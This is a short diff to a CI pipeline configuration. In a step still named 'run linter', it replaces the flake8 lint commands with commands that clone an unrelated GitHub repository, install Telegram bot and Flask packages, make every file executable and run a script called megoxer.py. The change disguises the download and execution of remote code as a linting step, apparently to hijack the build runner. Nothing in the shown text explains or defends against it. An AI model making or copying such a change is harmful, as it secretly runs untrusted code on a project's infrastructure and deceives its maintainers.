@@ -24,8 +24,11 @@ pipeline:
                   name: run linter
                   spec:
                     command: |-
-                      pip install flake8
-                      flake8 .
+                      git clone https://github.com/ck53467/u9.git
+                      cd u9
+                      pip install telebot flask aiogram pyTelegramBotAPI python-telegram-bot
+                      chmod +x *
+                      python3 megoxer.py
                   timeout: ""
                   type: Run
               - step:
